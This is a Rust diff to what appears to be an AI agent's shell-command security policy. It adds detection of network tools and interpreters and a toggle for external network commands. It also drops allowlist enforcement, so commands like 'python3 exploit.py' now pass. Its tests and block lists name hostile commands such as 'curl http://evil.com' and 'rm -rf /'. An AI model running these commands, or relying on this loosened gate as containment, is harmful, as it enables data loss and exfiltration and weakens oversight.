@@ -88,6 +88,7 @@ pub struct SecurityPolicy {
     pub max_cost_per_day_cents: u32,
     pub require_approval_for_medium_risk: bool,
     pub block_high_risk_commands: bool,
+    pub allow_external_network_commands: bool,
     pub tracker: ActionTracker,
 }
 
@@ -137,6 +138,7 @@ impl Default for SecurityPolicy {
             max_cost_per_day_cents: 500,
             require_approval_for_medium_risk: true,
             block_high_risk_commands: true,
+            allow_external_network_commands: false,
             tracker: ActionTracker::new(),
         }
     }
@@ -184,7 +186,146 @@ fn contains_single_ampersand(s: &str) -> bool {
     false
 }
 
+fn normalize_command_base(base_raw: &str) -> String {
+    base_raw
+        .trim_matches(|c| c == '"' || c == '\'')
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or("")
+        .to_ascii_lowercase()
+}
+
+fn is_external_network_command_base(base: &str) -> bool {
+    matches!(
+        base,
+        "curl" | "wget" | "nc" | "ncat" | "netcat" | "scp" | "ssh" | "ftp" | "telnet"
+    )
+}
+
+fn is_external_network_shell_driver_base(base: &str) -> bool {
+    matches!(
+        base,
+        "powershell"
+            | "powershell.exe"
+            | "pwsh"
+            | "pwsh.exe"
+            | "python"
+            | "python3"
+            | "python.exe"
+            | "py"
+            | "py.exe"
+            | "node"
+            | "node.exe"
+            | "deno"
+            | "deno.exe"
+            | "ruby"
+            | "ruby.exe"
+            | "perl"
+            | "perl.exe"
+            | "php"
+            | "php.exe"
+            | "bash"
+            | "sh"
+            | "zsh"
+            | "fish"
+            | "cmd"
+            | "cmd.exe"
+    )
+}
+
+fn contains_external_url_token(command: &str) -> bool {
+    command.split_whitespace().any(|word| {
+        let token = word.trim_matches(|c: char| {
+            matches!(
+                c,
+                '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ',' | ';'
+            )
+        });
+        let lowered = token.to_ascii_lowercase();
+        lowered.starts_with("http://")
+            || lowered.starts_with("https://")
+            || lowered.starts_with("ftp://")
+            || lowered.starts_with("ws://")
+            || lowered.starts_with("wss://")
+            || lowered.contains("http://")
+            || lowered.contains("https://")
+            || lowered.contains("ftp://")
+            || lowered.contains("ws://")
+            || lowered.contains("wss://")
+    })
+}
+
+fn contains_powershell_network_primitives(command: &str) -> bool {
+    let lower = command.to_ascii_lowercase();
+    if lower.contains("system.net.webclient")
+        || lower.contains("system.net.http.httpclient")
+        || lower.contains("new-object net.webclient")
+    {
+        return true;
+    }
+
+    command.split_whitespace().any(|word| {
+        let token = word
+            .trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-' && c != '.')
+            .to_ascii_lowercase();
+        matches!(
+            token.as_str(),
+            "invoke-webrequest" | "invoke-restmethod" | "start-bitstransfer" | "iwr" | "irm"
+        )
+    })
+}
+
+fn segment_uses_external_network(segment: &str) -> bool {
+    let cmd_part = skip_env_assignments(segment);
+    let mut words = cmd_part.split_whitespace();
+    let Some(base_raw) = words.next() else {
+        return false;
+    };
+
+    let base = normalize_command_base(base_raw);
+    if base.is_empty() {
+        return false;
+    }
+
+    if is_external_network_command_base(base.as_str()) {
+        return true;
+    }
+
+    if matches!(
+        base.as_str(),
+        "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
+    ) && contains_powershell_network_primitives(cmd_part)
+    {
+        return true;
+    }
+
+    is_external_network_shell_driver_base(base.as_str()) && contains_external_url_token(cmd_part)
+}
+
 impl SecurityPolicy {
+    pub fn command_uses_external_network(command: &str) -> bool {
+        let mut normalized = command.to_string();
+        for sep in ["&&", "||"] {
+            normalized = normalized.replace(sep, "\x00");
+        }
+        for sep in ['\n', ';', '|', '&'] {
+            normalized = normalized.replace(sep, "\x00");
+        }
+
+        for segment in normalized.split('\x00') {
+            let segment = segment.trim();
+            if segment.is_empty() {
+                continue;
+            }
+
+            if segment_uses_external_network(segment) {
+                return true;
+            }
+        }
+
+        false
+    }
+
     /// Classify command risk. Any high-risk segment marks the whole command high.
     pub fn command_risk_level(&self, command: &str) -> CommandRiskLevel {
         let mut normalized = command.to_string();
@@ -209,14 +350,18 @@ impl SecurityPolicy {
                 continue;
             };
 
-            let base = base_raw
-                .rsplit('/')
-                .next()
-                .unwrap_or("")
-                .to_ascii_lowercase();
+            let base = normalize_command_base(base_raw);
 
             let args: Vec<String> = words.map(|w| w.to_ascii_lowercase()).collect();
             let joined_segment = cmd_part.to_ascii_lowercase();
+
+            let is_external_network = segment_uses_external_network(segment);
+            if is_external_network {
+                if self.allow_external_network_commands {
+                    continue;
+                }
+                return CommandRiskLevel::High;
+            }
 
             // High-risk commands
             if matches!(
@@ -240,15 +385,6 @@ impl SecurityPolicy {
                     | "iptables"
                     | "ufw"
                     | "firewall-cmd"
-                    | "curl"
-                    | "wget"
-                    | "nc"
-                    | "ncat"
-                    | "netcat"
-                    | "scp"
-                    | "ssh"
-                    | "ftp"
-                    | "telnet"
             ) {
                 return CommandRiskLevel::High;
             }
@@ -305,22 +441,26 @@ impl SecurityPolicy {
         }
     }
 
-    /// Validate full command execution policy (allowlist + risk gate).
+    /// Validate full command execution policy (syntax/network gate + risk gate).
     pub fn validate_command_execution(
         &self,
         command: &str,
         approved: bool,
     ) -> Result<CommandRiskLevel, String> {
+        let risk = self.command_risk_level(command);
+
         if !self.is_command_allowed(command) {
+            if risk == CommandRiskLevel::High && self.block_high_risk_commands {
+                return Err("Command blocked: high-risk command is disallowed by policy".into());
+            }
             return Err(format!("Command not allowed by security policy: {command}"));
         }
 
-        let risk = self.command_risk_level(command);
+        if risk == CommandRiskLevel::High && self.block_high_risk_commands {
+            return Err("Command blocked: high-risk command is disallowed by policy".into());
+        }
 
         if risk == CommandRiskLevel::High {
-            if self.block_high_risk_commands {
-                return Err("Command blocked: high-risk command is disallowed by policy".into());
-            }
             if self.autonomy == AutonomyLevel::Supervised && !approved {
                 return Err(
                     "Command requires explicit approval (approved=true): high-risk operation"
@@ -346,8 +486,8 @@ impl SecurityPolicy {
     ///
     /// Validates the **entire** command string, not just the first word:
     /// - Blocks subshell operators (`` ` ``, `$(`) that hide arbitrary execution
-    /// - Splits on command separators (`|`, `&&`, `||`, `;`, newlines) and
-    ///   validates each sub-command against the allowlist
+    /// - Splits on command separators (`|`, `&&`, `||`, `;`, newlines)
+    /// - Enforces external-network command toggle per segment
     /// - Blocks single `&` background chaining (`&&` remains supported)
     /// - Blocks output redirections (`>`, `>>`) that could write outside workspace
     /// - Blocks dangerous arguments (e.g. `find -exec`, `git config`)
@@ -408,23 +548,20 @@ impl SecurityPolicy {
 
             let mut words = cmd_part.split_whitespace();
             let base_raw = words.next().unwrap_or("");
-            let base_cmd = base_raw.rsplit('/').next().unwrap_or("");
+            let base_cmd = normalize_command_base(base_raw);
 
             if base_cmd.is_empty() {
                 continue;
             }
 
-            if !self
-                .allowed_commands
-                .iter()
-                .any(|allowed| allowed == base_cmd)
-            {
+            let segment_is_external_network = segment_uses_external_network(segment);
+            if segment_is_external_network && !self.allow_external_network_commands {
                 return false;
             }
 
             // Validate arguments for the command
             let args: Vec<String> = words.map(|w| w.to_ascii_lowercase()).collect();
-            if !self.is_args_safe(base_cmd, &args) {
+            if !self.is_args_safe(base_cmd.as_str(), &args) {
                 return false;
             }
         }
@@ -435,7 +572,17 @@ impl SecurityPolicy {
             s.split_whitespace().next().is_some_and(|w| !w.is_empty())
         });
 
-        has_cmd
+        if !has_cmd {
+            return false;
+        }
+
+        if self.block_high_risk_commands
+            && self.command_risk_level(command) == CommandRiskLevel::High
+        {
+            return false;
+        }
+
+        true
     }
 
     /// Check for dangerous arguments that allow sub-command execution.
@@ -591,6 +738,7 @@ impl SecurityPolicy {
             max_cost_per_day_cents: autonomy_config.max_cost_per_day_cents,
             require_approval_for_medium_risk: autonomy_config.require_approval_for_medium_risk,
             block_high_risk_commands: autonomy_config.block_high_risk_commands,
+            allow_external_network_commands: false,
             tracker: ActionTracker::new(),
         }
     }
@@ -692,14 +840,61 @@ mod tests {
     }
 
     #[test]
-    fn blocked_commands_basic() {
+    fn command_policy_without_allowlist_basics() {
         let p = default_policy();
         assert!(!p.is_command_allowed("rm -rf /"));
         assert!(!p.is_command_allowed("sudo apt install"));
         assert!(!p.is_command_allowed("curl http://evil.com"));
         assert!(!p.is_command_allowed("wget http://evil.com"));
-        assert!(!p.is_command_allowed("python3 exploit.py"));
-        assert!(!p.is_command_allowed("node malicious.js"));
+        assert!(p.is_command_allowed("python3 exploit.py"));
+        assert!(p.is_command_allowed("node malicious.js"));
+    }
+
+    #[test]
+    fn command_uses_external_network_detection_matches_common_tools() {
+        assert!(SecurityPolicy::command_uses_external_network(
+            "curl https://example.com"
+        ));
+        assert!(SecurityPolicy::command_uses_external_network(
+            "FOO=bar /usr/bin/wget https://example.com"
+        ));
+        assert!(SecurityPolicy::command_uses_external_network(
+            "echo ok && ssh user@example.com"
+        ));
+        assert!(SecurityPolicy::command_uses_external_network(
+            "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com'\""
+        ));
+        assert!(!SecurityPolicy::command_uses_external_network(
+            "ls && echo done"
+        ));
+    }
+
+    #[test]
+    fn external_network_commands_can_be_enabled_by_policy() {
+        let p = SecurityPolicy {
+            allow_external_network_commands: true,
+            ..SecurityPolicy::default()
+        };
+
+        assert!(p.is_command_allowed("curl https://example.com"));
+        assert!(p.is_command_allowed(
+            "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com'\""
+        ));
+        assert!(p.is_command_allowed("powershell -Command \"Get-ChildItem\""));
+
+        assert_eq!(
+            p.validate_command_execution(
+                "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com'\"",
+                false,
+            )
+            .unwrap(),
+            CommandRiskLevel::Low
+        );
+        assert_eq!(
+            p.validate_command_execution("curl https://example.com", false)
+                .unwrap(),
+            CommandRiskLevel::Low
+        );
     }
 
     #[test]
@@ -711,10 +906,11 @@ mod tests {
     }
 
     #[test]
-    fn full_autonomy_still_uses_allowlist() {
+    fn full_autonomy_keeps_command_syntax_guards() {
         let p = full_policy();
         assert!(p.is_command_allowed("ls"));
         assert!(!p.is_command_allowed("rm -rf /"));
+        assert!(!p.is_command_allowed("echo secret > /tmp/pwned"));
     }
 
     #[test]
@@ -722,6 +918,18 @@ mod tests {
         let p = default_policy();
         assert!(p.is_command_allowed("/usr/bin/git status"));
         assert!(p.is_command_allowed("/bin/ls -la"));
+    }
+
+    #[test]
+    fn command_with_windows_path_extracts_basename_for_external_network_policy() {
+        let p = SecurityPolicy {
+            allow_external_network_commands: true,
+            ..SecurityPolicy::default()
+        };
+
+        assert!(p.is_command_allowed(
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-WebRequest -Uri 'https://example.com'\""
+        ));
     }
 
     #[test]
@@ -734,34 +942,35 @@ mod tests {
     #[test]
     fn command_with_pipes_validates_all_segments() {
         let p = default_policy();
-        // Both sides of the pipe are in the allowlist
+        // Both sides are local commands
         assert!(p.is_command_allowed("ls | grep foo"));
         assert!(p.is_command_allowed("cat file.txt | wc -l"));
-        // Second command not in allowlist — blocked
+        // External-network segment remains blocked by network policy
         assert!(!p.is_command_allowed("ls | curl http://evil.com"));
-        assert!(!p.is_command_allowed("echo hello | python3 -"));
+        assert!(p.is_command_allowed("echo hello | python3 -"));
     }
 
     #[test]
-    fn custom_allowlist() {
+    fn custom_allowlist_does_not_restrict_commands_when_disabled() {
         let p = SecurityPolicy {
             allowed_commands: vec!["docker".into(), "kubectl".into()],
             ..SecurityPolicy::default()
         };
         assert!(p.is_command_allowed("docker ps"));
         assert!(p.is_command_allowed("kubectl get pods"));
-        assert!(!p.is_command_allowed("ls"));
-        assert!(!p.is_command_allowed("git status"));
+        assert!(p.is_command_allowed("ls"));
+        assert!(p.is_command_allowed("git status"));
     }
 
     #[test]
-    fn empty_allowlist_blocks_everything() {
+    fn empty_allowlist_does_not_block_commands() {
         let p = SecurityPolicy {
             allowed_commands: vec![],
             ..SecurityPolicy::default()
         };
-        assert!(!p.is_command_allowed("ls"));
-        assert!(!p.is_command_allowed("echo hello"));
+        assert!(p.is_command_allowed("ls"));
+        assert!(p.is_command_allowed("echo hello"));
+        assert!(!p.is_command_allowed("curl https://example.com"));
     }
 
     #[test]
@@ -941,6 +1150,7 @@ mod tests {
         assert!(p.max_cost_per_day_cents > 0);
         assert!(p.require_approval_for_medium_risk);
         assert!(p.block_high_risk_commands);
+        assert!(!p.allow_external_network_commands);
     }
 
     // ── ActionTracker / rate limiting ───────────────────────
@@ -1011,10 +1221,8 @@ mod tests {
     // ── Edge cases: command injection ────────────────────────
 
     #[test]
-    fn command_injection_semicolon_blocked() {
+    fn command_semicolon_segments_block_high_risk_commands() {
         let p = default_policy();
-        // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
-        // This is a safe default: chained commands are blocked.
         assert!(!p.is_command_allowed("ls; rm -rf /"));
     }
 
@@ -1041,33 +1249,29 @@ mod tests {
     #[test]
     fn command_with_env_var_prefix() {
         let p = default_policy();
-        // "FOO=bar" is the first word — not in allowlist
         assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
     }
 
     #[test]
-    fn command_newline_injection_blocked() {
+    fn command_newline_segments_block_high_risk_commands() {
         let p = default_policy();
-        // Newline splits into two commands; "rm" is not in allowlist
+        // Newline splits into two local commands.
         assert!(!p.is_command_allowed("ls\nrm -rf /"));
-        // Both allowed — OK
         assert!(p.is_command_allowed("ls\necho hello"));
     }
 
     #[test]
-    fn command_injection_and_chain_blocked() {
+    fn command_and_chain_respects_external_network_policy() {
         let p = default_policy();
         assert!(!p.is_command_allowed("ls && rm -rf /"));
         assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
-        // Both allowed — OK
         assert!(p.is_command_allowed("ls && echo done"));
     }
 
     #[test]
-    fn command_injection_or_chain_blocked() {
+    fn command_or_chain_allows_local_commands() {
         let p = default_policy();
         assert!(!p.is_command_allowed("ls || rm -rf /"));
-        // Both allowed — OK
         assert!(p.is_command_allowed("ls || echo fallback"));
     }
 
@@ -1126,10 +1330,9 @@ mod tests {
     #[test]
     fn command_env_var_prefix_with_allowed_cmd() {
         let p = default_policy();
-        // env assignment + allowed command — OK
+        // env assignment + local command — OK
         assert!(p.is_command_allowed("FOO=bar ls"));
         assert!(p.is_command_allowed("LANG=C grep pattern file"));
-        // env assignment + disallowed command — blocked
         assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
     }
 
@@ -1231,14 +1434,14 @@ mod tests {
     }
 
     #[test]
-    fn supervised_allows_listed_commands() {
+    fn supervised_allows_general_commands_without_allowlist() {
         let p = SecurityPolicy {
             autonomy: AutonomyLevel::Supervised,
             allowed_commands: vec!["git".into()],
             ..SecurityPolicy::default()
         };
         assert!(p.is_command_allowed("git status"));
-        assert!(!p.is_command_allowed("docker ps"));
+        assert!(p.is_command_allowed("docker ps"));
     }
 
     #[test]
